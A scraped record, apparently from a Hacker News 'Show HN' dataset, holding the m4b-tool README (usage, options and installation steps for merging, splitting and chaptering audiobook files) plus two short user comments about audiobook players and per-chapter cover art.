given patterns (e.g. %a/%t for author/title) - parameter --output-file must be a directory (multiple values allowed) --dry-run perform a dry run without converting all the files in batch mode (requires --batch-pattern) --jobs[=JOBS] Specifies the number of jobs (commands) to run simultaneously [default: 1] --use-filenames-as-chapters Use filenames for chapter titles instead of tag contents --no-chapter-reindexing Do not perform any reindexing for index-only chapter names (by default m4b-tool will try to detect index-only chapters like Chapter 1, Chapter 2 and reindex it with its numbers only) -h, --help Display this help message -q, --quiet Do not output any message -V, --version Display this application version --ansi Force ANSI output --no-ansi Disable ANSI output -n, --no-interaction Do not ask any interactive question -v|vv|vvv, --verbose Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug Placeholder reference for --batch-pattern If you use the --batch-pattern parameter, the following placeholders are supported title / name: %n sort_name: %N album: %m, sort_album: %M, artist: %a, sort_artist: %a, genre: %g, writer: %w, album_artist: %t, year: %y, description: %d, long_description: %d, comment: %c, copyright: %c, encoded_by: %e, series: %s, series_part: %p, split m4b-tool can be used to split a single m4b into a file per chapter or a flac encoded album into single tracks via cue sheet. Example: m4b-tool split --audio-format mp3 --audio-bitrate 96k --audio-channels 1 --audio-samplerate 22050 \"data/my-audio-book.m4b\" This splits the file data/my-audio-book.m4b into an mp3 file for each chapter, writing the files into data/my-audio-book_splitted/. Cue sheet splitting (experimental) If you would like to split a flac file containing multiple tracks, a cue sheet with the exact filename of the flac is required (my-album.flac requires my-album.cue): # my-album.cue is automatically found and used for splitting m4b-tool split --audio-format=mp3 --audio-bitrate=192k --audio-channels=2 --audio-samplerate=48000 \"data/my-album.flac\" Reference For all options, see m4b-tool split --help: Description: Splits an m4b file into parts Usage: split [options] [--] <input> Arguments: input Input file or folder Options: --logfile[=LOGFILE] file to dump all output [default: \"\"] --debug enable debug mode - sets verbosity to debug, logfile to m4b-tool.log and temporary files are not deleted -f, --force force overwrite of existing files --no-cache do not use cached values and clear cache completely --ffmpeg-threads[=FFMPEG-THREADS] specify -threads parameter for ffmpeg [default: \"\"] --platform-charset[=PLATFORM-CHARSET] Convert from this filesystem charset to utf-8, when tagging files (e.g. Windows-1252, mainly used on Windows Systems) [default: \"\"] --ffmpeg-param[=FFMPEG-PARAM] Add argument to every ffmpeg call, append after all other ffmpeg parameters (e.g. --ffmpeg-param=\"-max_muxing_queue_size\" --ffmpeg-param=\"1000\" for ffmpeg [...] -max_muxing_queue_size 1000) (multiple values allowed) -a, --silence-min-length[=SILENCE-MIN-LENGTH] silence minimum length in milliseconds [default: 1750] -b, --silence-max-length[=SILENCE-MAX-LENGTH] silence maximum length in milliseconds [default: 0] --max-chapter-length[=MAX-CHAPTER-LENGTH] maximum chapter length in seconds - its also possible to provide a desired chapter length in form of 300,900 where 300 is desired and 900 is max - if the max chapter length is exceeded, the chapter is placed on the first silence between desired and max chapter length [default: \"0\"] --audio-format[=AUDIO-FORMAT] output format, that ffmpeg will use to create files [default: \"m4b\"] --audio-channels[=AUDIO-CHANNELS] audio channels, e.g. 1, 2 [default: \"\"] --audio-bitrate[=AUDIO-BITRATE] audio bitrate, e.g. 64k, 128k, ... [default: \"\"] --audio-samplerate[=AUDIO-SAMPLERATE] audio samplerate, e.g. 22050, 44100, ... [default: \"\"] --audio-codec[=AUDIO-CODEC] audio codec, e.g. libmp3lame, aac, ... [default: \"\"] --audio-profile[=AUDIO-PROFILE] audio profile, when using extra low bitrate - valid values (mono, stereo): aac_he, aac_he_v2 [default: \"\"] --adjust-for-ipod auto adjust bitrate and sampling rate for ipod, if track is to long (may lead to poor quality) --name[=NAME] provide a custom audiobook name, otherwise the existing metadata will be used [default: \"\"] --sortname[=SORTNAME] provide a custom audiobook name, that is used only for sorting purposes [default: \"\"] --album[=ALBUM] provide a custom audiobook album, otherwise the existing metadata for name will be used [default: \"\"] --sortalbum[=SORTALBUM] provide a custom audiobook album, that is used only for sorting purposes [default: \"\"] --artist[=ARTIST] provide a custom audiobook artist, otherwise the existing metadata will be used [default: \"\"] --sortartist[=SORTARTIST] provide a custom audiobook artist, that is used only for sorting purposes [default: \"\"] --genre[=GENRE] provide a custom audiobook genre, otherwise the existing metadata will be used [default: \"\"] --writer[=WRITER] provide a custom audiobook writer, otherwise the existing metadata will be used [default: \"\"] --albumartist[=ALBUMARTIST] provide a custom audiobook albumartist, otherwise the existing metadata will be used [default: \"\"] --year[=YEAR] provide a custom audiobook year, otherwise the existing metadata will be used [default: \"\"] --cover[=COVER] provide a custom audiobook cover, otherwise the existing metadata will be used --description[=DESCRIPTION] provide a custom audiobook short description, otherwise the existing metadata will be used --longdesc[=LONGDESC] provide a custom audiobook long description, otherwise the existing metadata will be used --comment[=COMMENT] provide a custom audiobook comment, otherwise the existing metadata will be used --copyright[=COPYRIGHT] provide a custom audiobook copyright, otherwise the existing metadata will be used --encoded-by[=ENCODED-BY] provide a custom audiobook encoded-by, otherwise the existing metadata will be used --series[=SERIES] provide a custom audiobook series, this pseudo tag will be used to auto create sort order (e.g. Harry Potter or The Kingkiller Chronicles) --series-part[=SERIES-PART] provide a custom audiobook series part, this pseudo tag will be used to auto create sort order (e.g. 1 or 2.5) --skip-cover skip extracting and embedding covers --fix-mime-type try to fix MIME-type (e.g. from video/mp4 to audio/mp4) - this is needed for some players to prevent video window -o, --output-dir[=OUTPUT-DIR] output directory [default: \"\"] -p, --filename-template[=FILENAME-TEMPLATE] filename twig-template for output file naming [default: \"{{\\\"%03d\\\"|format(track)}}-{{title|raw}}\"] --use-existing-chapters-file use an existing manually edited chapters file <audiobook-name>.chapters.txt instead of embedded chapters for splitting -h, --help Display this help message -q, --quiet Do not output any message -V, --version Display this application version --ansi Force ANSI output --no-ansi Disable ANSI output -n, --no-interaction Do not ask any interactive question -v|vv|vvv, --verbose Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug Help: Split an m4b into multiple m4b or mp3 files by chapter filename-template reference If you would like to use a custom filename template, the Twig template engine is provided. The following variables are available: {{encoder}} {{title}} {{artist}} {{genre}} {{writer}} {{album}} {{disk}} {{disks}} {{albumArtist}} {{year}} {{track}} {{tracks}} {{cover}} {{description}} {{longDescription}} {{comment}} {{copyright}} {{encodedBy}} You can also use some Twig specific template extensions to pad or reformat these values. The default template is {{\\\"%03d\\\"|format(track)}}-{{title}}, which results in filenames like 001-mychapter Slashes are interpreted as directory separators, so if you use a template {{year}}/{{artist}}/{{title}} the resulting directory and file is 2018/Joanne K. Rowling/Harry Potter 1 It is not recommended to use {{description}} or {{longdescription}} for filenames but they are also provided, if the field contains other information than intended Special chars, that are forbidden in filenames are removed automatically chapters Many m4b audiobook files do not contain valid chapters for different reasons. m4b-tool can handle two cases: Correct misplaced chapters by silence detection Add chapters from an internet source (mostly for well known titles) Misplaced chapters In some cases there is a shift between the chapter mark and the real beginning of a chapter. m4b-tool could try to correct that by detecting silences and relocating the chapter to the nearest silence: m4b-tool chapters --adjust-by-silence -o \"data/destination-with-adjusted-chapters.m4b\" \"data/source-with-misplaced-chapters.m4b\" It won't work, if the shift is to large or if the chapters are strongly misplaced, but since everything is done automatically, it's worth a try, isn't it? Too long chapters Sometimes you have a file that contains valid chapters, but they are too long, so you would like to split them into sub-chapters. This is tricky, because the chapters command relays only on metadata and not on track length - so it won't work. BUT: There might be a workaround. In the latest pre-release since July 2020 you can do the following: Put the source file into an empty directory, e.g. input/my-file.m4b (this is important, don't skip this step!) Run m4b-tool merge -v --no-conversion --max-chapter-length=300,900 \"input/\" -o \"output/my-rechaptered-file.m4b\" Because of --no-conversion the chaptering process is lossless, but it takes the existing chapters as input and recalculates it based on the --max-chapter-length parameter and a new silence detection. No chapters at all If you have a well known audiobook, like Harry Potter and the Philosophers Stone, you might be lucky that it is on musicbrainz. In this case m4b-tool can try to correct the chapter information using silence detection and the musicbrainz data. Since this is not a trivial task and prone to error, m4b-tool offers some parameters to correct misplaced chapter positions manually. A typical workflow Getting the musicbrainz id You have to find the exact musicbrainz id: An easy way to find the book is to use the authors name or the readers name to search for it Once you found the book of interest, click on the list entry to show further information To get the musicbrainz id, open the details page and find the MBID (e.g. 8669da33-bf9c-47fe-adc9-23798a37b096) Example: https://musicbrainz.org/work/8669da33-bf9c-47fe-adc9-23798a37b096 MBID: 8669da33-bf9c-47fe-adc9-23798a37b096 Finding main chapters After getting the MBID you should find the main chapter points (where the name of the current chapter name is read aloud by the author). m4b-tool chapters --merge-similar --first-chapter-offset 4000 --last-chapter-offset 3500 -m 8669da33-bf9c-47fe-adc9-23798a37b096 \"../data/harry-potter-1.m4b\" Explanation: --merge-similar: merges all similar chapters (e.g. The Boy Who Lived, Part 1 and The Boy Who Lived, Part 2 will be merged to The Boy Who Lived) --first-chapter-offset: creates an start offset chapter called Offset First Chapter with a length of 4 seconds for skipping intros (e.g. audible, etc.) --last-chapter-offset: creates an end offset chapter called Offset Last Chapter with a length of 3,5 seconds for skipping outros (e.g. audible, etc.) -m: MBID Finding misplaced main chapters Now listen to the audiobook an go through the chapters. Lets assume, all but 2 chapters were detected correctly. The two misplaced chapters are chapter number 6 and 9. To find the real position of chapters 6 and 9 invoke: m4b-tool chapter --find-misplaced-chapters 5,8 --merge-similar --first-chapter-offset 4000 --last-chapter-offset 3500 -m 8669da33-bf9c-47fe-adc9-23798a37b096 \"../data/harry-potter-1.m4b\" Explanation: --find-misplaced-chapters: Comma separated list of chapter numbers, that were not detected correctly. Now m4b-tool will generate a potential chapter for every silence around the used chapter mark to find the right chapter position. Listen to the audiobook again and find the right chapter position. Note them down. Manually adjust misplaced chapters Next run the full chapter detection with the --no-chapter-import option, which prevents writing the chapters directly to the file. m4b-tool chapter --no-chapter-import --first-chapter-offset 4000 --last-chapter-offset 3500 -m 8669da33-bf9c-47fe-adc9-23798a37b096 \"../data/harry-potter-1.m4b\" To Adjust misplaced chapters, do the following: Change the start position of all misplaced chapters manually in the file ../data/harry-potter-1.chapters.txt Import the corrected chapters with mp4chaps -i ../data/harry-potter-1.m4b Listen to harry-potter-1.m4b again, now the chapters should be at the correct position. Troubleshooting If none of the chapters are detected correctly, this can have different reasons: The silence parts of this audiobook are too short for detection. To adjust the minimum silence length, use --silence-min-length 1000 setting the silence length to 1 second. Caution: To low values can lead to misplaced chapters and increased detection time. You provided the wrong MBID There is too much background noise in this specific audiobook, so that silences cannot be detected Reference For all options, see m4b-tool chapters --help: Description: Adds chapters to m4b file Usage: chapters [options] [--] <input> Arguments: input Input file or folder Options: --logfile[=LOGFILE] file to dump all output [default: \"\"] --debug enable debug mode - sets verbosity to debug, logfile to m4b-tool.log and temporary files are not deleted -f, --force force overwrite of existing files --no-cache do not use cached values and clear cache completely --ffmpeg-threads[=FFMPEG-THREADS] specify -threads parameter for ffmpeg [default: \"\"] --platform-charset[=PLATFORM-CHARSET] Convert from this filesystem charset to utf-8, when tagging files (e.g. Windows-1252, mainly used on Windows Systems) [default: \"\"] --ffmpeg-param[=FFMPEG-PARAM] Add argument to every ffmpeg call, append after all other ffmpeg parameters (e.g. --ffmpeg-param=\"-max_muxing_queue_size\" --ffmpeg-param=\"1000\" for ffmpeg [...] -max_muxing_queue_size 1000) (multiple values allowed) -a, --silence-min-length[=SILENCE-MIN-LENGTH] silence minimum length in milliseconds [default: 1750] -b, --silence-max-length[=SILENCE-MAX-LENGTH] silence maximum length in milliseconds [default: 0] --max-chapter-length[=MAX-CHAPTER-LENGTH] maximum chapter length in seconds - its also possible to provide a desired chapter length in form of 300,900 where 300 is desired and 900 is max - if the max chapter length is exceeded, the chapter is placed on the first silence between desired and max chapter length [default: \"0\"] -m, --musicbrainz-id=MUSICBRAINZ-ID musicbrainz id so load chapters from -s, --merge-similar merge similar chapter names -o, --output-file[=OUTPUT-FILE] write chapters to this output file [default: \"\"] --adjust-by-silence will try to adjust chapters of a file by silence detection and existing chapter marks --find-misplaced-chapters[=FIND-MISPLACED-CHAPTERS] mark silence around chapter numbers that where not detected correctly, e.g. 8,15,18 [default: \"\"] --find-misplaced-offset[=FIND-MISPLACED-OFFSET] mark silence around chapter numbers with this offset seconds maximum [default: 120] --find-misplaced-tolerance[=FIND-MISPLACED-TOLERANCE] mark another chapter with this offset before each silence to compensate ffmpeg mismatches [default: -4000] --no-chapter-numbering do not append chapter number after name, e.g. My Chapter (1) --no-chapter-import do not import chapters into m4b-file, just create chapters.txt --chapter-pattern[=CHAPTER-PATTERN] regular expression for matching chapter name [default: \"/^[^:]+[1-9][0-9]*:[\\s]*(.*),.*[1-9][0-9]*[\\s]*$/i\"] --chapter-replacement[=CHAPTER-REPLACEMENT] regular expression replacement for matching chapter name [default: \"$1\"] --chapter-remove-chars[=CHAPTER-REMOVE-CHARS] remove these chars from chapter name [default: \"\"] --first-chapter-offset[=FIRST-CHAPTER-OFFSET] milliseconds to add after silence on chapter start [default: 0] --last-chapter-offset[=LAST-CHAPTER-OFFSET] milliseconds to add after silence on chapter start [default: 0] -h, --help Display this help message -q, --quiet Do not output any message -V, --version Display this application version --ansi Force ANSI output --no-ansi Disable ANSI output -n, --no-interaction Do not ask any interactive question -v|vv|vvv, --verbose Increase the verbosity of messages: 1 for normal output, 2 for more verbose output and 3 for debug Help: Can add Chapters to m4b files via different types of inputs Latest release m4b-tool is a one-man-project, so sometimes it evolves quickly and often nothing happens. If you have reported an issue and it is marked as fixed, there might be no stable release for a long time. That's why now there is a latest tag in combination with a Pre-Release for testing purposes. These releases always contain the most recent builds with all available fixes and new features. Mostly untested, there may be new bugs, non-functional features or - pretty unlikely - critical issues with the risk of data loss. Feedback is always welcome, but don't expect that these are fixed quickly. To get the Pre-Release, go to https://github.com/sandreas/m4b-tool/releases/tag/latest and download the m4b-tool.tar.gz or if using docker rebuild the image with: docker build . --build-arg M4B_TOOL_DOWNLOAD_LINK=<link-to-pre-release> -t m4b-tool Building from source m4b-tool contains a build script, which will create an executable m4b-tool.phar in the dist folder. Composer for PHP is required, so after installing composer, run following commands in project root folder: Linux / Unix Install Dependencies (Ubuntu) sudo apt install ffmpeg mp4v2-utils fdkaac php-cli composer phpunit php-mbstring Build macOS Install Dependencies (brew) brew update brew install php@7.4 phpunit brew link php@7.4 Build Windows Request for help - especially german users Right now, I'm experimenting with speech recognition and speech to text using this project This is for a feature to automatically add chapter names by speech recognition. I'm not sure this will be ever working as expected, but right now I'm pretty confident, it is possible to do the following, if there are enough speech samples in a specific language: Extract chapter names and first sentences of a chapter from an ebook Detect all silences in the audiobook Perform a speech to text for the first 30 seconds after the silence Compare it with the text parts of the ebook, mark the chapter positions and add real chapters names To do that and improve the german speech recognition, I would really appreciate YOUR help on: https://voice.mozilla.org/de (german) No account is needed to help You can support mozilla DeepSpeech to better support german speech recognition by just verifying sentences after listening or, even more important, reading out loud and uploading sentences. I try to add a few ones every day, its really easy and quite fun. At the moment the german speech recognition is not good enough for the algorithm, but I will check out every now and then - as soon the recognition is working good enough, I'll go on with this feature. ",
          "I'm curious: what players do people use so that they feel the need to <i>merge</i> an audiobook into a single file? With VLC, the accuracy of my aim on the time bar would become nonexistent. Just two days ago I've finally whipped up a script to <i>split</i> books, and not by chapters but into 10-minute chunks.",
          "Another poster cited \"a cover per chapter, etc\" as an advantage, but I don't see that capability in the linked tool (and I don't think it's part of the m4b format, which is a shame - the ability to change art per chapter or even more so, at points in the timeline, would really open some new uses e.g. saved lectures with slides)."
        ],
        "story_type": ["ShowHN"],
        "url": "https://github.com/sandreas/m4b-tool",
        "comments.comment_id": [19856487, 19859685],
        "comments.comment_author": ["aasasd", "schemathings"],
        "comments.comment_descendants": [2, 1],
        "comments.comment_time": [
          "2019-05-08T06:54:39Z",
          "2019-05-08T15:24:49Z"
        ],
        "comments.comment_text": [
          "I'm curious: what players do people use so that they feel the need to <i>merge</i> an audiobook into a single file? With VLC, the accuracy of my aim on the time bar would become nonexistent. Just two days ago I've finally whipped up a script to <i>split</i> books, and not by chapters but into 10-minute chunks.",
          "Another poster cited \"a cover per chapter, etc\" as an advantage, but I don't see that capability in the linked tool (and I don't think it's part of the m4b format, which is a shame - the ability to change art per chapter or even more so, at points in the timeline, would really open some new uses e.g. saved lectures with slides)."
        ],
        "id": "c782e919-0359-47d9-b1af-5f1c20df1cd4",
        "url_text": "m4b-tool m4b-tool is a is a wrapper for ffmpeg and mp4v2 to merge, split or and manipulate audiobook files with chapters. Although m4b-tool is designed to handle m4b files, nearly all audio formats should be supported, e.g. mp3, aac, ogg, alac and flac. Important Note Unfortunately I am pretty busy at the moment, so m4b-tool 0.4.2 is very old. Since it is not planned to release a newer version without having complete documentation, there is only the latest pre-release getting bug fixes. It is already pretty stable, so if you are experiencing bugs with v0.4.2, please try the latest pre-release, if it has been already fixed there. Thank you, sandreas https://pilabor.com Features merge a set of audio files (e.g. MP3 or AAC) into a single m4b file split a single m4b file into several output files by chapters or a flac encoded album into single tracks via cue sheet Add or adjust chapters for an existing m4b file via silence detection or musicbrainz TL;DR - examples for the most common tasks Merge multiple files merge all audio files in directory data/my-audio-book into file data/merged.m4b (tags are retained and data/my-audio-book/cover.jpg and data/my-audio-book/description.txt are embedded, if available) m4b-tool merge \"data/my-audio-book/\" --output-file=\"data/merged.m4b\" Split one file by chapters split one big m4b file by chapters into multiple mp3 files at data/my-audio-book_splitted/ (tags are retained, data/my-audio-book_splitted/cover.jpg is created, if m4b contains a cover) m4b-tool split --audio-format mp3 --audio-bitrate 96k --audio-channels 1 --audio-samplerate 22050 \"data/my-audio-book.m4b\" Chapters adjustment of a file via silence detection chapters can try to adjust existing chapters of an m4b by silence detection m4b-tool chapters --adjust-by-silence -o \"data/destination-with-adjusted-chapters.m4b\" \"data/source-with-misplaced-chapters.m4b\" Best practices Since the most used subcommand of m4b-tool seems to be merge, lets talk about best practice... Step 0 - Take a look at the docker image Unfortunately m4b-tool has many dependencies. Not only one-liners, if you would like to get the best quality and tagging support, many dependencies have to be compiled manually with extra options. Thats why you should take a look at the docker image, which comes with all the bells and whistles of top audio quality, top tagging support and easy installation and has almost no disadvantages. Note: If you are on windows, it might be difficult to make it work Step 1 - Organizing your audiobooks in directories When merging audiobooks, you should prepare them - the following directory structure helps a lot, even if you only merge one single audiobook: input/<main genre>/<author>/<title> or if it is a series input/<main genre>/<author>/<series>/<series-part> - <title> Examples: input/Fantasy/J.K. Rowling/Quidditch Through the Ages/ input/Fantasy/J.K. Rowling/Harry Potter/1 - Harry Potter and the Philosopher's Stone/ Note: If your audiobook title contains invalid path characters like /, just replace them with a dash -. Step 2 - add cover and a description Now, because you almost always want a cover and a description for your audiobook, you should add the following files in the main directory: cover.jpg description.txt (Be sure to use UTF-8 text file encoding for the contents) Examples: input/Fantasy/J.K. Rowling/Quidditch Through the Ages/cover.jpg input/Fantasy/J.K. Rowling/Quidditch Through the Ages/description.txt Note: m4b-tool will find and embed these files automatically but does not fail, if they are not present Step 3 - chapters Chapters are nice to add waypoints for your audiobook. They help to remember the last position and improve the experience in general. fixed chapters If you would like to adjust chapters manually, you can add a chapters.txt (same location as cover.jpg) with following contents (<chapter-start> <chapter-title>): 00:00:00.000 Intro 00:04:19.153 This is 00:09:24.078 A way to add 00:14:34.500 Chapters manually by tag If your input files are tagged, these tags will be used to create the chapter metadata by its title. So if you tag your input files with valid chapter names as track title, this will result in a nice and clean m4b-file with valid chapter names. by length Another great feature since m4b-tool v.0.4.0 is the --max-chapter-length parameter. Often the individual input files are too big which results in chapters with a very long duration. This can be annoying, if you would like to jump to a certain point, since you have to rewind or fast-forward and hold the button for a long time, instead of just tipping previous or next a few times. To automatically add sub-chapters, you could provide: --max-chapter-length=300,900 This will cause m4b-tool Trying to preserve original chapters as long as they are not longer than 15 minutes (900 seconds) If a track is longer than 15 minutes Perform a silence detection and try to add sub-chapters at every silence between 5 minutes (300 seconds) and 15 minutes (900 seconds) If no silence is detected, add a hard cut sub-chapter every 5 minutes Sub-chapters are named like the original and get an additional index. This is a nice way to keep the real names but not having chapters with a too long duration. Step 4 (optional) - for iPod owners If you own an iPod, there might be a problem with too long audiobooks, since iPods only support 32bit sampling rates. If your audiobook is longer than 27 hours with 22050Hz sampling rate, you could provide --adjust-for-ipod, to automatically downsample your audiobook, which results in lower quality, but at least its working on your good old iPod... Step 5 (optional) - more cpu cores, faster conversion m4b-tool supports multiple conversion tasks in parallel with the --jobs parameter (e.g. --jobs=2). If you have to convert more than one file, which is the common case, you nearly double the merge speed by providing the --jobs=2 parameter (or quadruplicate with --jobs=4, if you have a quad core system, etc.). Don't provide a number higher than the number of cores on your system - this will slow down the merge... Note: If you run the conversion on all your cores, it will result in almost 100% CPU usage, which may lead to slower system performance Step 6 - Use the --batch-pattern feature In m4b-tool v.0.4.0 the --batch-pattern feature was added. It can be used to batch-convert multiple audiobooks at once, but also to just convert one single audiobook - because you can create tags from an existing directory structure. Hint: The output-file parameter has to be a directory, when using --batch-pattern. Even multiple --batch-pattern parameters are supported, while the first match will be used first. So if you created the directory structure as described above, the final command to merge input/Fantasy/Harry Potter/1 - Harry Potter and the Philosopher's Stone/ to output/Fantasy/Harry Potter/1 - Harry Potter and the Philosopher's Stone.m4b would look like this: m4b-tool merge -v --jobs=2 --output-file=\"output/\" --max-chapter-length=300,900 --adjust-for-ipod --batch-pattern=\"input/%g/%a/%s/%p - %n/\" --batch-pattern=\"input/%g/%a/%n/\" \"input/\" In --batch-pattern mode, existing files are skipped by default Result If you performed the above steps with the docker image or installed and compiled all dependencies, you should get the following result: Top quality audio by using libfdk_aac encoder Series and single audiobooks have valid tags for genre, author, title, sorttitle, etc. from --batch-pattern usage If the files cover.jpg and description.txt exist in the main directories, a cover, a description and a longdesc are embedded If you tagged the input files, real chapter names should appear in your player No more chapters longer than 15 minutes Working iPod versions for audiobooks longer than 27 hours Installation Docker To use docker with m4b-tool, you first have to build a custom image located in the docker directory. Since this image is compiling every third party library from scratch to get the best possible audio quality, it can take a long time for the first build. Note: You should know that build does not mean that m4b-tool is being compiled from source. That indeed is strange, but unlike other projects, the m4b-tool docker image only downloads the latest binary release unless you do some extra work (see below). # clone m4b-tool repository git clone https://github.com/sandreas/m4b-tool.git # change directory cd m4b-tool # build docker image - this will take a while docker build . -t m4b-tool # create an alias for m4b-tool running docker alias m4b-tool='docker run -it --rm -u $(id -u):$(id -g) -v \"$(pwd)\":/mnt m4b-tool' # testing the command m4b-tool --version Note: If you use the alias above, keep in mind that you cannot use absolute paths (e.g. /tmp/data/audiobooks/harry potter 1) or symlinks. You must change into the directory and use relative paths (e.g. cd /tmp/data && m4b-tool merge \"audiobooks/harry potter 1\" --output-file harry.m4b) Dockerize a Pre-Release or an older release version To build a docker container using a Pre-Release or an older m4b-tool release, it is required to provide an extra parameter for downloading a specific version into the image, e.g. for v.0.4.1: docker build . --build-arg M4B_TOOL_DOWNLOAD_LINK=https://github.com/sandreas/m4b-tool/releases/download/v.0.4.1/m4b-tool.tar.gz -t m4b-tool Note: You could also just edit the according variable in the Dockerfile. Dockerize a custom build, that is not available via download link Developers or experts might want to run a complete custom build of m4b-tool or build the code themselves (e.g. if you forked the repository and applied some patches). If that is the case, you can store the custom build to dist/m4b-tool.phar relative to the Dockerfile and then do a default build. # dist/m4b-tool.phar is available docker build . -t m4b-tool After this the custom build should be integrated into the docker image. MacOS On MacOS you may use the awesome package manager brew to install m4b-tool. Recommended: High audio quality, sort tagging Getting best audio quality requires some additional effort. You have to recompile ffmpeg with the non-free libfdk_aac codec. This requires uninstalling the default ffmpeg package if installed, since brew dropped the possibility for extra options. There is no official ffmpeg-with-options repository, but a pretty decent tap, that you could use to save time. # FIRST INSTALL ONLY: if not already done, remove existing ffmpeg with default audio quality options # check for ffmpeg with libfdk and uninstall if libfdk is not already available [ -x \"$(which ffmpeg)\" ] && (ffmpeg -hide_banner -codecs 2>&1 | grep libfdk || brew uninstall ffmpeg) # tap required repositories brew tap sandreas/tap brew tap homebrew-ffmpeg/ffmpeg # check available ffmpeg options and which you would like to use brew options homebrew-ffmpeg/ffmpeg/ffmpeg # install ffmpeg with at least libfdk_aac for best audio quality brew install homebrew-ffmpeg/ffmpeg/ffmpeg --with-fdk-aac # install m4b-tool brew install sandreas/tap/m4b-tool # check installed m4b-tool version m4b-tool --version Stick to defaults (acceptable audio quality, no sort tagging) If the above did not work for you or you would just to checkout m4b-tool before using it in production, you might want to try the quick and easy way. It will work, but you get lower audio quality and there is no support for sort tagging. # tap m4b-tool repository brew tap sandreas/tap # install dependencies brew install ffmpeg fdk-aac-encoder mp4v2 # install m4b-tool with acceptable audio quality and no sort tagging brew install --ignore-dependencies sandreas/tap/m4b-tool Ubuntu # install all dependencies sudo apt install ffmpeg mp4v2-utils fdkaac php-cli php-intl php-json php-mbstring php-xml # install / upgrade m4b-tool sudo wget https://github.com/sandreas/m4b-tool/releases/download/v.0.4.2/m4b-tool.phar -O /usr/local/bin/m4b-tool && sudo chmod +x /usr/local/bin/m4b-tool # check installed m4b-tool version m4b-tool --version Note: If you would like to get the best possible audio quality, you have to compile ffmpeg with the high quality encoder fdk-aac (--enable-libfdk_aac) - see https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu for a step-by-step guide to compile ffmpeg. Manual installation (only recommended on Windows systems) m4b-tool is written in PHP and uses ffmpeg, mp4v2 and optionally fdkaac for high efficiency codecs to perform conversions. Therefore you will need the following tools in your %PATH%: php >= 7.1 with mbstring extension enabled (https://php.net) ffmpeg (https://www.ffmpeg.org) mp4v2 (mp4chaps, mp4art, etc. https://github.com/sandreas/m4b-tool/releases/download/v0.2/mp4v2-windows.zip) fdkaac (optional, only if you need high efficiency for low bitrates <= 32k, http://wlc.io/2015/06/20/fdk-aac/ - caution: not official!) To check the dependencies, running following commands via command line should show similar output: $ php -v Copyright (c) 1997-2018 The PHP Group [...] $ ffmpeg -version ffmpeg version 4.1.1 Copyright (c) 2000-2019 the FFmpeg developers [...] $ mp4chaps --version mp4chaps - MP4v2 2.0.0 $ fdkaac fdkaac 1.0.0 [...] If you are sure, all dependencies are installed, the next step is to download the latest release of m4b-tool from https://github.com/sandreas/m4b-tool/releases Depending on the operating system, you can rename m4b-tool.phar to m4b-tool and run m4b-tool --version directly from the command line. If you are not sure, you can always use the command php m4b-tool.phar --version to check if the installation was successful. This should work on every system. If you would like to use the latest source code with all new features and fixes, you could also build from source. The current build might be in unstable and should only be used for testing purposes or if you need a specific feature that has not been released. Custom mp4v2 for accurate sorting order Most audiobooks are not released in alphabetical order. A prominent example is Harry Potter. So if you have all the Harry Potter audiobooks, it depends on your player, but probably they are not listed in the correct order... let's see, what the alphabetical order would be: Harry Potter and the Chamber of Secrets (Part 2) Harry Potter and the Philosopher's Stone (Part 1) Harry Potter and the Prisoner of Azkaban (Part 3) And the correct order would have been: Harry Potter and the Philosopher's Stone (Part 1) Harry Potter and the Chamber of Secrets (Part 2) Harry Potter and the Prisoner of Azkaban (Part 3) Well, there is a solution for this. You have to tag the audiobook with a custom sortname and / or sortalbum. If your player supports these tags, the order is now correct, even when the title is still the original title. To achieve this, i had to build a custom version of mp4v2 (more accurate mp4tags), to add options for these tags and add the pseudo tags --series and --series-part. So if you do the following: m4b-tool merge --name=\"Harry Potter and the Chamber of Secrets\" --series=\"Harry Potter\" --series-part=\"2\" --output-file=\"output/Harry Potter and the Chamber of Secrets.m4b\" \"input/Harry Potter and the Chamber of Secrets\" It would result in: Name: Harry Potter and the Chamber of Secrets Sortname: Harry Potter 2 - Harry Potter and the Chamber of Secrets Install custom mp4v2 In the docker image, the custom version is already installed git clone https://github.com/sandreas/mp4v2 cd mp4v2 ./configure make && sudo make install About audio quality In m4b-tool all audio conversions are performed with ffmpeg resulting in pretty descent audio quality using its free encoders. However, best quality takes some extra effort, so if you are using the free encoders, m4b-tool might show the following hint: Your ffmpeg version cannot produce top quality aac using encoder aac instead of libfdk_aac That's not really a problem, because the difference between the aac and libfdk_aac encoder is hardly noticeable in most cases. But to overcome the hint and get the best audio quality possible, you have to use a non-free encoder, that is not integrated in ffmpeg by default (licensing reasons). Depending on the operating system you are using, installing the non-free encoder may require a little extra skills, effort and time (see the notes for your operating system above). You have to decide, if it is worth the additional effort for getting the slightly better quality. If you are using the docker image, you should get the best quality by default. If you are using very low bitrates (<= 32k), you could also use high efficiency profiles to further improve audio quality (e.g. --audio-profile=aac_he for mono). Unfortunately, ffmpeg's high efficiency implementation produces audio files, that are incompatible with many players (including iTunes). To produce high efficiency files, that are compatible with at least most common players, you will need to install fdkaac for now. More Details: https://github.com/sandreas/m4b-tool/issues/19 https://trac.ffmpeg.org/wiki/Encode/AAC https://trac.ffmpeg.org/wiki/Encode/HighQualityAudio Submitting issues You think there is an issue with m4b-tool? First take a look at the Known Issues below. If this does not help, please provide the following information when adding an issue: the operating system you use the exact command, that you tried, e.g. m4b-tool merge my-audio-book/ --output-file merged.m4b the error message, that occured or the circumstances, e.g. the resulting file merged.m4b is only 5kb other relevant information, e.g. sample files if needed Example: Title: m4b-tool does not embed covers If i run m4b-tool with a folder containing a cover.png, it does not embed the cover and shows an error message. OS: Ubuntu 16.04 LTS Command: `m4b-tool merge my-audio-book/ ---output-file merged.m4b` Error: Cannot embed cover, cover is not a valid image file Attached files: cover.png Known issues If you are getting PHP Exceptions, it is a configuration issue with PHP in most cases. If are not familiar with PHP configuration, you could follow these instructions, to fix a few known issues: Exception Charset not supported [Exception] charset windows-1252 is not supported - use one of these instead: utf-8 This mostly happens on windows, because the mbstring-Extension is used to internally convert charsets, so that special chars like german umlauts are supported on every platform. To fix this, you need to enable the mbstring-extension: Run php --ini on the command line: C:\\>php --ini ... Loaded Configuration File: C:\\Program Files\\php\\php.ini Open the configuration file (e.g. C:\\Program Files\\php\\php.ini) in a text editor and search for extension=. On Windows there should be an item like this: ;extension=php_mbstring.dll remove the ; to enable the extension: extension=php_mbstring.dll Now everything should work as expected. m4b-tool commands The following list contains all possible commands including merge, split and chapters 